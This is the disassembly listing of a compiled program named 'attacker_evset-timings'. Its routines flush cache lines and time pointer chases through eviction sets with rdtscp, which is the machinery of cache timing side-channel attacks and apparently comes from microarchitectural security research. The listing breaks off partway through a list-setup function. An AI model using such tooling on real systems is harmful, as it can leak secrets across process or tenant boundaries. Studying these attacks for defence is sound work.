
./build/attacker_evset-timings:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	48 83 ec 08          	sub    $0x8,%rsp
    1004:	48 8b 05 c5 4f 00 00 	mov    0x4fc5(%rip),%rax        # 5fd0 <__gmon_start__@Base>
    100b:	48 85 c0             	test   %rax,%rax
    100e:	74 02                	je     1012 <_init+0x12>
    1010:	ff d0                	call   *%rax
    1012:	48 83 c4 08          	add    $0x8,%rsp
    1016:	c3                   	ret

Disassembly of section .plt:

0000000000001020 <free@plt-0x10>:
    1020:	ff 35 ca 4f 00 00    	push   0x4fca(%rip)        # 5ff0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	ff 25 cc 4f 00 00    	jmp    *0x4fcc(%rip)        # 5ff8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000001030 <free@plt>:
    1030:	ff 25 ca 4f 00 00    	jmp    *0x4fca(%rip)        # 6000 <free@GLIBC_2.2.5>
    1036:	68 00 00 00 00       	push   $0x0
    103b:	e9 e0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001040 <puts@plt>:
    1040:	ff 25 c2 4f 00 00    	jmp    *0x4fc2(%rip)        # 6008 <puts@GLIBC_2.2.5>
    1046:	68 01 00 00 00       	push   $0x1
    104b:	e9 d0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001050 <qsort@plt>:
    1050:	ff 25 ba 4f 00 00    	jmp    *0x4fba(%rip)        # 6010 <qsort@GLIBC_2.2.5>
    1056:	68 02 00 00 00       	push   $0x2
    105b:	e9 c0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001060 <fclose@plt>:
    1060:	ff 25 b2 4f 00 00    	jmp    *0x4fb2(%rip)        # 6018 <fclose@GLIBC_2.2.5>
    1066:	68 03 00 00 00       	push   $0x3
    106b:	e9 b0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001070 <strlen@plt>:
    1070:	ff 25 aa 4f 00 00    	jmp    *0x4faa(%rip)        # 6020 <strlen@GLIBC_2.2.5>
    1076:	68 04 00 00 00       	push   $0x4
    107b:	e9 a0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001080 <mmap@plt>:
    1080:	ff 25 a2 4f 00 00    	jmp    *0x4fa2(%rip)        # 6028 <mmap@GLIBC_2.2.5>
    1086:	68 05 00 00 00       	push   $0x5
    108b:	e9 90 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001090 <printf@plt>:
    1090:	ff 25 9a 4f 00 00    	jmp    *0x4f9a(%rip)        # 6030 <printf@GLIBC_2.2.5>
    1096:	68 06 00 00 00       	push   $0x6
    109b:	e9 80 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010a0 <srand@plt>:
    10a0:	ff 25 92 4f 00 00    	jmp    *0x4f92(%rip)        # 6038 <srand@GLIBC_2.2.5>
    10a6:	68 07 00 00 00       	push   $0x7
    10ab:	e9 70 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010b0 <strtol@plt>:
    10b0:	ff 25 8a 4f 00 00    	jmp    *0x4f8a(%rip)        # 6040 <strtol@GLIBC_2.2.5>
    10b6:	68 08 00 00 00       	push   $0x8
    10bb:	e9 60 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010c0 <time@plt>:
    10c0:	ff 25 82 4f 00 00    	jmp    *0x4f82(%rip)        # 6048 <time@GLIBC_2.2.5>
    10c6:	68 09 00 00 00       	push   $0x9
    10cb:	e9 50 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010d0 <fileno@plt>:
    10d0:	ff 25 7a 4f 00 00    	jmp    *0x4f7a(%rip)        # 6050 <fileno@GLIBC_2.2.5>
    10d6:	68 0a 00 00 00       	push   $0xa
    10db:	e9 40 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010e0 <malloc@plt>:
    10e0:	ff 25 72 4f 00 00    	jmp    *0x4f72(%rip)        # 6058 <malloc@GLIBC_2.2.5>
    10e6:	68 0b 00 00 00       	push   $0xb
    10eb:	e9 30 ff ff ff       	jmp    1020 <_init+0x20>

00000000000010f0 <realloc@plt>:
    10f0:	ff 25 6a 4f 00 00    	jmp    *0x4f6a(%rip)        # 6060 <realloc@GLIBC_2.2.5>
    10f6:	68 0c 00 00 00       	push   $0xc
    10fb:	e9 20 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001100 <munmap@plt>:
    1100:	ff 25 62 4f 00 00    	jmp    *0x4f62(%rip)        # 6068 <munmap@GLIBC_2.2.5>
    1106:	68 0d 00 00 00       	push   $0xd
    110b:	e9 10 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001110 <madvise@plt>:
    1110:	ff 25 5a 4f 00 00    	jmp    *0x4f5a(%rip)        # 6070 <madvise@GLIBC_2.2.5>
    1116:	68 0e 00 00 00       	push   $0xe
    111b:	e9 00 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001120 <fopen@plt>:
    1120:	ff 25 52 4f 00 00    	jmp    *0x4f52(%rip)        # 6078 <fopen@GLIBC_2.2.5>
    1126:	68 0f 00 00 00       	push   $0xf
    112b:	e9 f0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001130 <perror@plt>:
    1130:	ff 25 4a 4f 00 00    	jmp    *0x4f4a(%rip)        # 6080 <perror@GLIBC_2.2.5>
    1136:	68 10 00 00 00       	push   $0x10
    113b:	e9 e0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001140 <getline@plt>:
    1140:	ff 25 42 4f 00 00    	jmp    *0x4f42(%rip)        # 6088 <getline@GLIBC_2.2.5>
    1146:	68 11 00 00 00       	push   $0x11
    114b:	e9 d0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001150 <exit@plt>:
    1150:	ff 25 3a 4f 00 00    	jmp    *0x4f3a(%rip)        # 6090 <exit@GLIBC_2.2.5>
    1156:	68 12 00 00 00       	push   $0x12
    115b:	e9 c0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001160 <fstat@plt>:
    1160:	ff 25 32 4f 00 00    	jmp    *0x4f32(%rip)        # 6098 <fstat@GLIBC_2.33>
    1166:	68 13 00 00 00       	push   $0x13
    116b:	e9 b0 fe ff ff       	jmp    1020 <_init+0x20>

0000000000001170 <rand@plt>:
    1170:	ff 25 2a 4f 00 00    	jmp    *0x4f2a(%rip)        # 60a0 <rand@GLIBC_2.2.5>
    1176:	68 14 00 00 00       	push   $0x14
    117b:	e9 a0 fe ff ff       	jmp    1020 <_init+0x20>

Disassembly of section .plt.got:

0000000000001180 <__cxa_finalize@plt>:
    1180:	ff 25 5a 4e 00 00    	jmp    *0x4e5a(%rip)        # 5fe0 <__cxa_finalize@GLIBC_2.2.5>
    1186:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

0000000000001190 <_start>:
    1190:	31 ed                	xor    %ebp,%ebp
    1192:	49 89 d1             	mov    %rdx,%r9
    1195:	5e                   	pop    %rsi
    1196:	48 89 e2             	mov    %rsp,%rdx
    1199:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
    119d:	50                   	push   %rax
    119e:	54                   	push   %rsp
    119f:	45 31 c0             	xor    %r8d,%r8d
    11a2:	31 c9                	xor    %ecx,%ecx
    11a4:	48 8d 3d 4c 13 00 00 	lea    0x134c(%rip),%rdi        # 24f7 <main>
    11ab:	ff 15 0f 4e 00 00    	call   *0x4e0f(%rip)        # 5fc0 <__libc_start_main@GLIBC_2.34>
    11b1:	f4                   	hlt
    11b2:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
    11b9:	00 00 00 
    11bc:	0f 1f 40 00          	nopl   0x0(%rax)

00000000000011c0 <deregister_tm_clones>:
    11c0:	48 8d 3d f1 4e 00 00 	lea    0x4ef1(%rip),%rdi        # 60b8 <__TMC_END__>
    11c7:	48 8d 05 ea 4e 00 00 	lea    0x4eea(%rip),%rax        # 60b8 <__TMC_END__>
    11ce:	48 39 f8             	cmp    %rdi,%rax
    11d1:	74 15                	je     11e8 <deregister_tm_clones+0x28>
    11d3:	48 8b 05 ee 4d 00 00 	mov    0x4dee(%rip),%rax        # 5fc8 <_ITM_deregisterTMCloneTable@Base>
    11da:	48 85 c0             	test   %rax,%rax
    11dd:	74 09                	je     11e8 <deregister_tm_clones+0x28>
    11df:	ff e0                	jmp    *%rax
    11e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
    11e8:	c3                   	ret
    11e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000000011f0 <register_tm_clones>:
    11f0:	48 8d 3d c1 4e 00 00 	lea    0x4ec1(%rip),%rdi        # 60b8 <__TMC_END__>
    11f7:	48 8d 35 ba 4e 00 00 	lea    0x4eba(%rip),%rsi        # 60b8 <__TMC_END__>
    11fe:	48 29 fe             	sub    %rdi,%rsi
    1201:	48 89 f0             	mov    %rsi,%rax
    1204:	48 c1 ee 3f          	shr    $0x3f,%rsi
    1208:	48 c1 f8 03          	sar    $0x3,%rax
    120c:	48 01 c6             	add    %rax,%rsi
    120f:	48 d1 fe             	sar    %rsi
    1212:	74 14                	je     1228 <register_tm_clones+0x38>
    1214:	48 8b 05 bd 4d 00 00 	mov    0x4dbd(%rip),%rax        # 5fd8 <_ITM_registerTMCloneTable@Base>
    121b:	48 85 c0             	test   %rax,%rax
    121e:	74 08                	je     1228 <register_tm_clones+0x38>
    1220:	ff e0                	jmp    *%rax
    1222:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
    1228:	c3                   	ret
    1229:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001230 <__do_global_dtors_aux>:
    1230:	f3 0f 1e fa          	endbr64
    1234:	80 3d 7d 4e 00 00 00 	cmpb   $0x0,0x4e7d(%rip)        # 60b8 <__TMC_END__>
    123b:	75 2b                	jne    1268 <__do_global_dtors_aux+0x38>
    123d:	55                   	push   %rbp
    123e:	48 83 3d 9a 4d 00 00 	cmpq   $0x0,0x4d9a(%rip)        # 5fe0 <__cxa_finalize@GLIBC_2.2.5>
    1245:	00 
    1246:	48 89 e5             	mov    %rsp,%rbp
    1249:	74 0c                	je     1257 <__do_global_dtors_aux+0x27>
    124b:	48 8b 3d 5e 4e 00 00 	mov    0x4e5e(%rip),%rdi        # 60b0 <__dso_handle>
    1252:	e8 29 ff ff ff       	call   1180 <__cxa_finalize@plt>
    1257:	e8 64 ff ff ff       	call   11c0 <deregister_tm_clones>
    125c:	c6 05 55 4e 00 00 01 	movb   $0x1,0x4e55(%rip)        # 60b8 <__TMC_END__>
    1263:	5d                   	pop    %rbp
    1264:	c3                   	ret
    1265:	0f 1f 00             	nopl   (%rax)
    1268:	c3                   	ret
    1269:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000001270 <frame_dummy>:
    1270:	f3 0f 1e fa          	endbr64
    1274:	e9 77 ff ff ff       	jmp    11f0 <register_tm_clones>

0000000000001279 <compare_uint64>:
    1279:	55                   	push   %rbp
    127a:	48 89 e5             	mov    %rsp,%rbp
    127d:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1281:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    1285:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1289:	48 8b 00             	mov    (%rax),%rax
    128c:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1290:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1294:	48 8b 00             	mov    (%rax),%rax
    1297:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    129b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    129f:	48 39 45 f0          	cmp    %rax,-0x10(%rbp)
    12a3:	0f 92 c0             	setb   %al
    12a6:	0f b6 d0             	movzbl %al,%edx
    12a9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12ad:	48 3b 45 f0          	cmp    -0x10(%rbp),%rax
    12b1:	0f 92 c0             	setb   %al
    12b4:	0f b6 c0             	movzbl %al,%eax
    12b7:	29 c2                	sub    %eax,%edx
    12b9:	89 d0                	mov    %edx,%eax
    12bb:	5d                   	pop    %rbp
    12bc:	c3                   	ret

00000000000012bd <median_uint64>:
    12bd:	55                   	push   %rbp
    12be:	48 89 e5             	mov    %rsp,%rbp
    12c1:	48 83 ec 10          	sub    $0x10,%rsp
    12c5:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    12c9:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    12cd:	48 8b 75 f0          	mov    -0x10(%rbp),%rsi
    12d1:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12d5:	48 8d 15 9d ff ff ff 	lea    -0x63(%rip),%rdx        # 1279 <compare_uint64>
    12dc:	48 89 d1             	mov    %rdx,%rcx
    12df:	ba 08 00 00 00       	mov    $0x8,%edx
    12e4:	48 89 c7             	mov    %rax,%rdi
    12e7:	e8 64 fd ff ff       	call   1050 <qsort@plt>
    12ec:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    12f0:	83 e0 01             	and    $0x1,%eax
    12f3:	48 85 c0             	test   %rax,%rax
    12f6:	75 3a                	jne    1332 <median_uint64+0x75>
    12f8:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    12fc:	48 d1 e8             	shr    %rax
    12ff:	48 c1 e0 03          	shl    $0x3,%rax
    1303:	48 8d 50 f8          	lea    -0x8(%rax),%rdx
    1307:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    130b:	48 01 d0             	add    %rdx,%rax
    130e:	48 8b 10             	mov    (%rax),%rdx
    1311:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1315:	48 d1 e8             	shr    %rax
    1318:	48 8d 0c c5 00 00 00 	lea    0x0(,%rax,8),%rcx
    131f:	00 
    1320:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1324:	48 01 c8             	add    %rcx,%rax
    1327:	48 8b 00             	mov    (%rax),%rax
    132a:	48 01 d0             	add    %rdx,%rax
    132d:	48 d1 e8             	shr    %rax
    1330:	eb 19                	jmp    134b <median_uint64+0x8e>
    1332:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1336:	48 d1 e8             	shr    %rax
    1339:	48 8d 14 c5 00 00 00 	lea    0x0(,%rax,8),%rdx
    1340:	00 
    1341:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1345:	48 01 d0             	add    %rdx,%rax
    1348:	48 8b 00             	mov    (%rax),%rax
    134b:	c9                   	leave
    134c:	c3                   	ret

000000000000134d <my_access>:
    134d:	55                   	push   %rbp
    134e:	48 89 e5             	mov    %rsp,%rbp
    1351:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1355:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1359:	48 8b 02             	mov    (%rdx),%rax
    135c:	90                   	nop
    135d:	5d                   	pop    %rbp
    135e:	c3                   	ret

000000000000135f <flush>:
    135f:	55                   	push   %rbp
    1360:	48 89 e5             	mov    %rsp,%rbp
    1363:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1367:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    136b:	0f ae 38             	clflush (%rax)
    136e:	90                   	nop
    136f:	5d                   	pop    %rbp
    1370:	c3                   	ret

0000000000001371 <probe_chase_loop>:
    1371:	55                   	push   %rbp
    1372:	48 89 e5             	mov    %rsp,%rbp
    1375:	53                   	push   %rbx
    1376:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    137a:	48 89 75 d8          	mov    %rsi,-0x28(%rbp)
    137e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1382:	48 8b 7d d8          	mov    -0x28(%rbp),%rdi
    1386:	48 89 c3             	mov    %rax,%rbx
    1389:	49 89 d8             	mov    %rbx,%r8
    138c:	49 89 f9             	mov    %rdi,%r9
    138f:	0f ae f0             	mfence
    1392:	0f 01 f9             	rdtscp
    1395:	48 89 c6             	mov    %rax,%rsi

0000000000001398 <loop>:
    1398:	0f ae e8             	lfence
    139b:	4d 8b 00             	mov    (%r8),%r8
    139e:	49 ff c9             	dec    %r9
    13a1:	0f ae e8             	lfence
    13a4:	75 f2                	jne    1398 <loop>
    13a6:	0f ae e8             	lfence
    13a9:	0f 01 f9             	rdtscp
    13ac:	48 29 f0             	sub    %rsi,%rax
    13af:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    13b3:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    13b7:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    13bb:	c9                   	leave
    13bc:	c3                   	ret

00000000000013bd <probe_evset_chase>:
    13bd:	55                   	push   %rbp
    13be:	48 89 e5             	mov    %rsp,%rbp
    13c1:	53                   	push   %rbx
    13c2:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
    13c6:	48 8b 05 f3 4c 00 00 	mov    0x4cf3(%rip),%rax        # 60c0 <conf>
    13cd:	48 8b 00             	mov    (%rax),%rax
    13d0:	48 8d 78 01          	lea    0x1(%rax),%rdi
    13d4:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    13d8:	48 89 c3             	mov    %rax,%rbx
    13db:	49 89 d8             	mov    %rbx,%r8
    13de:	49 89 f9             	mov    %rdi,%r9
    13e1:	0f ae f0             	mfence
    13e4:	0f 01 f9             	rdtscp
    13e7:	48 89 c6             	mov    %rax,%rsi

00000000000013ea <loop2>:
    13ea:	0f ae e8             	lfence
    13ed:	4d 8b 00             	mov    (%r8),%r8
    13f0:	49 ff c9             	dec    %r9
    13f3:	0f ae e8             	lfence
    13f6:	75 f2                	jne    13ea <loop2>
    13f8:	0f ae e8             	lfence
    13fb:	0f 01 f9             	rdtscp
    13fe:	48 29 f0             	sub    %rsi,%rax
    1401:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1405:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    1409:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    140d:	c9                   	leave
    140e:	c3                   	ret

000000000000140f <wait>:
    140f:	55                   	push   %rbp
    1410:	48 89 e5             	mov    %rsp,%rbp
    1413:	48 89 7d d8          	mov    %rdi,-0x28(%rbp)
    1417:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    141b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    141f:	0f 01 f9             	rdtscp
    1422:	89 ce                	mov    %ecx,%esi
    1424:	48 8b 4d f0          	mov    -0x10(%rbp),%rcx
    1428:	89 31                	mov    %esi,(%rcx)
    142a:	48 c1 e2 20          	shl    $0x20,%rdx
    142e:	48 09 d0             	or     %rdx,%rax
    1431:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1435:	90                   	nop
    1436:	48 8d 45 e4          	lea    -0x1c(%rbp),%rax
    143a:	48 89 45 e8          	mov    %rax,-0x18(%rbp)
    143e:	0f 01 f9             	rdtscp
    1441:	89 ce                	mov    %ecx,%esi
    1443:	48 8b 4d e8          	mov    -0x18(%rbp),%rcx
    1447:	89 31                	mov    %esi,(%rcx)
    1449:	48 c1 e2 20          	shl    $0x20,%rdx
    144d:	48 09 d0             	or     %rdx,%rax
    1450:	48 2b 45 f8          	sub    -0x8(%rbp),%rax
    1454:	48 3b 45 d8          	cmp    -0x28(%rbp),%rax
    1458:	72 dc                	jb     1436 <wait+0x27>
    145a:	90                   	nop
    145b:	90                   	nop
    145c:	5d                   	pop    %rbp
    145d:	c3                   	ret

000000000000145e <lfsr_create>:
    145e:	55                   	push   %rbp
    145f:	48 89 e5             	mov    %rsp,%rbp
    1462:	48 0f c7 f0          	rdrand %rax
    1466:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    146a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    146e:	5d                   	pop    %rbp
    146f:	c3                   	ret

0000000000001470 <lfsr_rand>:
    1470:	55                   	push   %rbp
    1471:	48 89 e5             	mov    %rsp,%rbp
    1474:	48 83 ec 20          	sub    $0x20,%rsp
    1478:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    147c:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    1483:	00 
    1484:	eb 1b                	jmp    14a1 <lfsr_rand+0x31>
    1486:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    148a:	48 8b 00             	mov    (%rax),%rax
    148d:	48 89 c7             	mov    %rax,%rdi
    1490:	e8 1c 00 00 00       	call   14b1 <lfsr_step>
    1495:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    1499:	48 89 02             	mov    %rax,(%rdx)
    149c:	48 83 45 f8 01       	addq   $0x1,-0x8(%rbp)
    14a1:	48 83 7d f8 3f       	cmpq   $0x3f,-0x8(%rbp)
    14a6:	76 de                	jbe    1486 <lfsr_rand+0x16>
    14a8:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    14ac:	48 8b 00             	mov    (%rax),%rax
    14af:	c9                   	leave
    14b0:	c3                   	ret

00000000000014b1 <lfsr_step>:
    14b1:	55                   	push   %rbp
    14b2:	48 89 e5             	mov    %rsp,%rbp
    14b5:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    14b9:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14bd:	83 e0 01             	and    $0x1,%eax
    14c0:	48 85 c0             	test   %rax,%rax
    14c3:	74 19                	je     14de <lfsr_step+0x2d>
    14c5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14c9:	48 d1 e8             	shr    %rax
    14cc:	48 89 c2             	mov    %rax,%rdx
    14cf:	48 b8 e2 19 00 00 00 	movabs $0x80000000000019e2,%rax
    14d6:	00 00 80 
    14d9:	48 31 d0             	xor    %rdx,%rax
    14dc:	eb 07                	jmp    14e5 <lfsr_step+0x34>
    14de:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    14e2:	48 d1 e8             	shr    %rax
    14e5:	5d                   	pop    %rbp
    14e6:	c3                   	ret

00000000000014e7 <config_init>:
    14e7:	55                   	push   %rbp
    14e8:	48 89 e5             	mov    %rsp,%rbp
    14eb:	48 83 ec 40          	sub    $0x40,%rsp
    14ef:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    14f3:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    14f7:	48 89 55 d8          	mov    %rdx,-0x28(%rbp)
    14fb:	48 89 4d d0          	mov    %rcx,-0x30(%rbp)
    14ff:	4c 89 45 c8          	mov    %r8,-0x38(%rbp)
    1503:	4c 89 4d c0          	mov    %r9,-0x40(%rbp)
    1507:	bf 38 00 00 00       	mov    $0x38,%edi
    150c:	e8 cf fb ff ff       	call   10e0 <malloc@plt>
    1511:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1515:	4c 8b 45 c8          	mov    -0x38(%rbp),%r8
    1519:	48 8b 7d d0          	mov    -0x30(%rbp),%rdi
    151d:	48 8b 4d d8          	mov    -0x28(%rbp),%rcx
    1521:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    1525:	48 8b 75 e8          	mov    -0x18(%rbp),%rsi
    1529:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    152d:	ff 75 10             	push   0x10(%rbp)
    1530:	ff 75 c0             	push   -0x40(%rbp)
    1533:	4d 89 c1             	mov    %r8,%r9
    1536:	49 89 f8             	mov    %rdi,%r8
    1539:	48 89 c7             	mov    %rax,%rdi
    153c:	e8 0a 00 00 00       	call   154b <config_update>
    1541:	48 83 c4 10          	add    $0x10,%rsp
    1545:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1549:	c9                   	leave
    154a:	c3                   	ret

000000000000154b <config_update>:
    154b:	55                   	push   %rbp
    154c:	48 89 e5             	mov    %rsp,%rbp
    154f:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    1553:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    1557:	48 89 55 e8          	mov    %rdx,-0x18(%rbp)
    155b:	48 89 4d e0          	mov    %rcx,-0x20(%rbp)
    155f:	4c 89 45 d8          	mov    %r8,-0x28(%rbp)
    1563:	4c 89 4d d0          	mov    %r9,-0x30(%rbp)
    1567:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    156b:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    156f:	48 89 10             	mov    %rdx,(%rax)
    1572:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1576:	48 8b 55 e8          	mov    -0x18(%rbp),%rdx
    157a:	48 89 50 08          	mov    %rdx,0x8(%rax)
    157e:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1582:	48 8b 55 e0          	mov    -0x20(%rbp),%rdx
    1586:	48 89 50 10          	mov    %rdx,0x10(%rax)
    158a:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    158e:	48 8b 55 d8          	mov    -0x28(%rbp),%rdx
    1592:	48 89 50 18          	mov    %rdx,0x18(%rax)
    1596:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    159a:	48 8b 55 d0          	mov    -0x30(%rbp),%rdx
    159e:	48 89 50 20          	mov    %rdx,0x20(%rax)
    15a2:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15a6:	48 8b 55 10          	mov    0x10(%rbp),%rdx
    15aa:	48 89 50 28          	mov    %rdx,0x28(%rax)
    15ae:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    15b2:	48 8b 55 18          	mov    0x18(%rbp),%rdx
    15b6:	48 89 50 30          	mov    %rdx,0x30(%rax)
    15ba:	90                   	nop
    15bb:	5d                   	pop    %rbp
    15bc:	c3                   	ret

00000000000015bd <list_init>:
    15bd:	55                   	push   %rbp
    15be:	48 89 e5             	mov    %rsp,%rbp
    15c1:	53                   	push   %rbx
    15c2:	48 83 ec 38          	sub    $0x38,%rsp
    15c6:	48 89 7d c8          	mov    %rdi,-0x38(%rbp)
    15ca:	48 89 75 c0          	mov    %rsi,-0x40(%rbp)
    15ce:	bf 00 00 00 00       	mov    $0x0,%edi
    15d3:	e8 e8 fa ff ff       	call   10c0 <time@plt>
    15d8:	89 c7                	mov    %eax,%edi
    15da:	e8 c1 fa ff ff       	call   10a0 <srand@plt>
    15df:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    15e3:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)
    15ea:	00 
    15eb:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    15ef:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    15f6:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    15fa:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    1601:	00 
    1602:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1606:	48 83 c0 18          	add    $0x18,%rax
    160a:	48 89 45 d0          	mov    %rax,-0x30(%rbp)
    160e:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%rbp)
    1615:	eb 20                	jmp    1637 <list_init+0x7a>
    1617:	8b 45 ec             	mov    -0x14(%rbp),%eax
    161a:	48 98                	cltq
    161c:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
    1623:	00 
    1624:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
    1628:	48 8d 1c 02          	lea    (%rdx,%rax,1),%rbx
    162c:	e8 3f fb ff ff       	call   1170 <rand@plt>
    1631:	89 03                	mov    %eax,(%rbx)
    1633:	83 45 ec 01          	addl   $0x1,-0x14(%rbp)
    1637:	83 7d ec 09          	cmpl   $0x9,-0x14(%rbp)
    163b:	7e da                	jle    1617 <list_init+0x5a>
    163d:	48 c7 45 e0 01 00 00 	movq   $0x1,-0x20(%rbp)
    1644:	00 
    1645:	e9 d5 00 00 00       	jmp    171f <list_init+0x162>
    164a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    164e:	48 c1 e0 06          	shl    $0x6,%rax
    1652:	48 8d 48 c0          	lea    -0x40(%rax),%rcx
    1656:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    165a:	48 c1 e0 06          	shl    $0x6,%rax
    165e:	48 89 c2             	mov    %rax,%rdx
    1661:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    1665:	48 01 d0             	add    %rdx,%rax
    1668:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    166c:	48 01 ca             	add    %rcx,%rdx
    166f:	48 89 50 08          	mov    %rdx,0x8(%rax)
    1673:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1677:	48 c1 e0 06          	shl    $0x6,%rax
    167b:	48 89 c1             	mov    %rax,%rcx
    167e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    1682:	48 c1 e0 06          	shl    $0x6,%rax
    1686:	48 89 c2             	mov    %rax,%rdx
    1689:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    168d:	48 01 d0             	add    %rdx,%rax
    1690:	48 8b 40 08          	mov    0x8(%rax),%rax
    1694:	48 8b 55 c8          	mov    -0x38(%rbp),%rdx
    1698:	48 01 ca             	add    %rcx,%rdx
    169b:	48 89 10             	mov    %rdx,(%rax)
    169e:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16a2:	48 c1 e0 06          	shl    $0x6,%rax
    16a6:	48 89 c2             	mov    %rax,%rdx
    16a9:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    16ad:	48 01 d0             	add    %rdx,%rax
    16b0:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
    16b7:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    16bb:	48 c1 e0 06          	shl    $0x6,%rax
    16bf:	48 89 c2             	mov    %rax,%rdx
    16c2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
    16c6:	48 01 d0             	add    %rdx,%rax
    16c9:	48 c7 40 10 00 00 00 	movq   $0x0,0x10(%rax)
    16d0:	00 
